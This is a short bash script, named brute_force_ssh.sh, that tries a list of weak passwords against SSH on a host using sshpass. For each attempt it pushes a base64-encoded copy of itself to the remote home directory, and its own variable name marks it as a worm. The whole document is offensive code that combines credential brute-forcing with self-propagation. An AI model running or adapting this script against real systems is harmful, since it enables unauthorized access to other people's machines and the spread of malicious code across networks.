#!/bin/bash

IP="10.0.0.1"
USER="test"
PASSWORDS=("user" "test" "admin")
FILENAME="brute_force_ssh.sh"
WORM="$HOME/Desktop/$FILENAME"
ENCODED=`cat $WORM | base64`

for PASS in "${PASSWORDS[@]}"
do
	echo "Trying user = $USER with password = $PASS"
	sshpass -p $PASS ssh $USER@$IP "echo \"$ENCODED\" | base64 -d > \$HOME/$FILENAME" 2> /dev/null
	if [ $? -eq 0 ]; then
	    echo "OK"
	else
	    echo "FAIL"
	fi
done
